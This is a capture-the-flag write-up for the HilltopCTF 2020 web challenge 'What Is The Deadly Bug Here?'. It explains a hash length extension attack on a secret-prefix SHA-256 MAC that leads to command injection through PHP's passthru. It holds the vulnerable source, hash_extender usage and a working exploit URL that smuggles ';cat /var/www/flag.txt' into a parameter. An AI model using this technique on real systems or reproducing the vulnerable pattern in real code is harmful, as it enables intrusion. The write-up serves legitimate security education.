---
title: What Is The Deadly Bug Here? - [Web, 50pts]
layout: post
competition: hilltopctf2020
pagetype: child
categories: ctf
---
## Description


![c9fd42053c1860b5e8adc479279ffeef.png](/assets/images/ec6165ad18424803876d01a024adcda0.png)


## Solving

Given a simple website that looks like this.

![0956ba0662dbb4f93d2dcaa8e8f2527a.png](/assets/images/1f07699a5c3a4904a02dc7d34bc68f56.png)

Examining the response of the request, we could found some interesting headers.

![662190ad5e6f3fa71a40cf56ef3f4240.png](/assets/images/64d64912595a4428b87bab10e38b0aeb.png)


Sending the `?debug` parameter to the website showed us the source code of the challenge. 

```
<?php
error_reporting(0);
ini_set('display_errors', 0);

require_once("secret.php");

function patched($alg, $string, $secret) 
{
    if (is_string($string)) {
        if ($alg === "sha256") {
            return hash($alg, $secret . $string);
        }
        else {
            header('HTTP/1.0 400 Bad Request');
            echo "That algorithm is not supported at the moment.";
            exit;
        }
    }
    else {
        header('HTTP/1.0 400 Bad Request');
        echo "Wouldn't work anymore hahahaha!";
        exit;
    }

}

$alg = "sha256";
$greet = "aboutme.txt";
header("X-MY-GREET: $greet");
header("X-MY-GREET-MAC: " . patched($alg, $greet, $secret));
header("X-SELF-NOTE: '?debug' in case I forgot.");

if (isset($_GET['debug'])) {
    highlight_file( __FILE__ );
}

if (empty($_GET['mac']) || empty($_GET['greet'])) {
    header('HTTP/1.0 400 Bad Request');
    echo "You need to provide 'mac' and 'greet', okay?";
    exit;
}

if (isset($_GET['alg'])) $alg = $_GET['alg'];

if (isset($_GET['greet'])) $greet = $_GET['greet'];

if (isset($_GET['nonce'])) $secret = patched($alg, $_GET['nonce'], $secret);

$mac = patched($alg, $greet, $secret);

// I still need to make sure the string is safe. Should this do?
$greet = filter_var($greet, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW|FILTER_FLAG_STRIP_HIGH);

if ($mac !== $_GET['mac']) {
    header('HTTP/1.0 403 Forbidden');
    echo "Nah it doesn't match.";
    exit;
}

// This is for testing, gonna make it dangerous since this won't be executed at all :).
echo passthru("cat $greet 2>&1", $err);
// echo $err;

?> You need to provide 'mac' and 'greet', okay?
```

There is some interesting information that we can get by statically analyzing the source code. Here are them:
1. `$greet` variable is supposed to contain a name of a file; and we can control the value as this line of code shows:
    ```
    if (isset($_GET['greet'])) $greet = $_GET['greet'];
    ```
2. If you get the reference, this challenge is based on [this](https://www.youtube.com/watch?v=MpeaSNERwQA) video on Youtube by LiveOverflow. `hash_hmac` function in that video is more or less the same with `patched` function in this challenge, but supplying an array into the function would not work anymore because of this line of code:
    ```
    if (is_string($string)) {
        ...
    }
    ```
    Anyway, if you don't understand what I'm talking about, please watch the video, it's all there :).
3. The `patched` function validates our input and returns a message-digested hash value from the input. The difference between this and the function in [that](https://www.youtube.com/watch?v=MpeaSNERwQA) video is: with the intention of patching (or should I say securing) the application, this challenge uses `hash` function instead of `hash_hmac` function to generate the hash value. By doing that, the application is potentially vulnerable to *Hash Length Extension Attack*. We'll come back to this very soon.
4. This line of code:
    ```
    $greet = filter_var($greet, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW|FILTER_FLAG_STRIP_HIGH);
    ```
    basically strips out every special character from the `$greet` variable.
5. If the `mac` we provide (`$_GET['mac'`) is not equals to the generated `mac` value, the application is terminated. So we need to make sure that both are the same.
6. Finally, this line of code:
    ```
    echo passthru("cat $greet 2>&1", $err);
    ```
    is how we are gonna get the flag. The `$greet` variable, which we can control, will be passed into `passthru` function; which will then be executed as a shell command.

*Hash Length Extension Attack* is a type of attack where an attacker can use a computed hash (Hash(*message1*)) and the length of the message (message1*) to calculate another hash (Hash(*message1* || *message2*)) for an attacker-controlled message (message2). An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data (read more [here](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)).

This challenge gives us a hash value and it's original data by sending the `X-MY-GREET` and `X-MY-GREET-MAC` header on the response. Thus, without knowing the secret, we can generate a valid hash for `secret + greet.txt + <arbitrary evil data>` without knowing the value of the prepended secret. We can use *bash command separation* to execute arbitrary command after reading the value of `greet.txt`. Simply put, this would be the payload we want to be passed to the `passthru` function:
```
echo greet.txt;cat /var/www/flag.txt 2>&1
```

The location of the flag can be found on the hint published for this challenge.

There are many tools out there, but for this writeup, [this](https://github.com/iagox86/hash_extender) tool from Ron Bowes will help us doing the *Length Extension Attack*. And here's how we used them:
```
hash_extender -d 'aboutme.txt' -s cabb57d8fb9ab6dbccbef600f370108ad331617dc5432fb55d0b4f2b7f5df01c -a ';cat /var/www/flag.txt' -f sha256 -l 25 --out-data-format=html
```
From the manual:
`-d` is the original string that we're going to extend
`-s` is the original signature or the hash value of the original string
`-a` is the data that we want to append to the original string
`-f` is the hash algorithm
`-l` is the length of the secret, which is leaked when we visit `secret.php` page

![5fb70b6dbb0ed2b07a53175556086711.png](/assets/images/2d86a44f5e294cadbda6a4d893b1b275.png)

Then we get our new hash and new message.
```
New signature: 3686b8643ff253c607ee7c4fdb838cef93caa99c0dc52f6c8ca028d0b257749c
New string: aboutme%2etxt%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01+%3bcat+%2fvar%2fwww%2fflag%2etxt

```

![98365288a99edd441e4e4743df0298b5.png](/assets/images/e49e327073c740f7a2194e00ef28c372.png)

Don't worry about the null bytes in the new message, because fortunately the challenge used `filter_var` and those null bytes will be stripped before being passed into `passthru` function.

Send the hash and the message to the application like this:
```
http://192.81.210.234:10002/?mac=3686b8643ff253c607ee7c4fdb838cef93caa99c0dc52f6c8ca028d0b257749c&greet=aboutme%2etxt%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01+%3bcat+%2fvar%2fwww%2fflag%2etxt
```

And there's the flag.



![44cba8a2af6184dd0fe48900c4f53949.png](/assets/images/3d59ab4e510d4dad9a613a30c21e5100.png)



## The Flag
Flag is **HilltopCTF{uh...1think_1mad3_itwors3_s00wy}**